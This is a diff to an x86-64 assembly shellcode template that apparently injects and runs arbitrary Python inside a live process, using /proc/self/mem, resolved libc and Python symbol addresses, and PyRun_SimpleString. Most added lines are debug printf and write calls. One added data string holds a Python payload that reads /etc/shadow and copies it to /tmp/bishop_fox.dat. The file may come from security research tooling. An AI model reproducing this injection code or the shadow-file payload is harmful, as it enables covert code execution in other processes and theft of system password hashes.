@@ -52,6 +52,38 @@ cld
 	rep movsb
 
 	lea rsp, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]
+	
+	// BEGIN: call LIBC printf
+	push rbx
+	lea rsi, [rip]
+	lea rdi, format_hex[rip]
+	xor rax, rax
+	mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	//movabsq rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	call rbx
+	pop rbx
+	// END: call LIBC printf
+
+	// BEGIN: call LIBC printf
+	push rbx
+	lea rsi, [old_rip[rip]]
+	lea rdi, format_hex[rip]
+	xor rax, rax
+	mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	call rbx
+	pop rbx
+	// END: call LIBC printf
+
+	
+	//debug
+	push rbx
+	mov rax,1 # write to file
+	mov rdi,1 # stdout
+	mov rdx,1 # number of bytes
+	lea rsi, dmsg[rip] #from buffer
+	syscall
+	pop rbx
+	///debug
 
 	# // BEGIN: call Py_Initialize()
 	# push rbx
@@ -59,6 +91,43 @@ cld
 	# call rbx
 	# pop rbx
 	# // END: call Py_Initialize()
+
+	//debug
+	push rbx
+	mov rax,1 # write to file
+	mov rdi,1 # stdout
+	mov rdx,1 # number of bytes
+	lea rsi, dmsg[rip] + 1 #from buffer
+	syscall
+	pop rbx
+	///debug
+	
+	// BEGIN: call LIBC printf
+	push rbx
+	push rcx
+	//mov rcx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	//mov rsi, [rcx]
+	movabsq rsi, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	//mov rsi, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	lea rdi, format_hex[rip]
+	xor rax, rax
+	mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	//movabsq rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	call rbx
+	pop rcx
+	pop rbx
+	// END: call LIBC printf
+	
+	// BEGIN: call LIBC printf
+	push rbx
+	movabsq rsi, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Ensure:RELATIVEOFFSET]
+	lea rdi, format_hex[rip]
+	xor rax, rax
+	mov rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	//movabsq rbx, [BASEADDRESS:.+/libc-[0-9\.]+.so$:BASEADDRESS] + [RELATIVEOFFSET:printf@@GLIBC_2.2.5:RELATIVEOFFSET]
+	call rbx
+	pop rbx
+	// END: call LIBC printf
 
 	// BEGIN: call PyGILState_Ensure() and store the handle it returns
 	push rbx
@@ -71,6 +140,14 @@ cld
 	pop rbx
 	// END: call PyGILState_Ensure()
 	
+	//debug
+	mov rax,1 # write to file
+	mov rdi,1 # stdout
+	mov rdx,1 # number of bytes
+	lea rsi, dmsg[rip] + 2 #from buffer
+	syscall
+	///debug
+
 	// BEGIN: call PyRun_SimpleString("arbitrary Python code here")
 	push rbx
 	mov rsi, 0
@@ -86,7 +163,15 @@ cld
 	// discard stack variable
 	add rsp, 8
 	// END: call PyRun_SimpleString("arbitrary Python code here")
-		
+	
+	//debug
+	mov rax,1 # write to file
+	mov rdi,1 # stdout
+	mov rdx,1 # number of bytes
+	lea rsi, dmsg[rip] + 3 #from buffer
+	syscall
+	///debug
+	
 	// BEGIN: call PyGILState_Release(handle)
 	push rbx
 	lea rax, varPythonHandle[rip]
@@ -95,7 +180,15 @@ cld
 	call rbx
 	pop rbx
 	// END: call PyGILState_Release(handle)
-			
+		
+	//debug
+	mov rax,1 # write to file
+	mov rdi,1 # stdout
+	mov rdx,1 # number of bytes
+	lea rsi, dmsg[rip] + 4 #from buffer
+	syscall
+	///debug
+	
 	# // BEGIN: call Py_Finalize()
 	# push rbx
 	# mov rax, 0
@@ -104,7 +197,15 @@ cld
 	# call rbx
 	# pop rbx
 	# // END: call Py_Finalize()
-		
+	
+	//debug
+	mov rax,1 # write to file
+	mov rdi,1 # stdout
+	mov rdx,1 # number of bytes
+	lea rsi, dmsg[rip] + 5 #from buffer
+	syscall
+	///debug
+	
 	mov rax, 0
 
 	fxrstor moar_regs[rip]
@@ -147,6 +248,12 @@ moar_regs:
 
 proc_self_mem:
 	.ascii "/proc/self/mem\0"
+	
+python_code1:
+	.ascii "print('OK');\0"
+
+python_code2:
+	.ascii "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishop_fox.dat', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();\0"
 
 python_code:
 	.ascii "[VARIABLE:pythoncode:VARIABLE]\0"
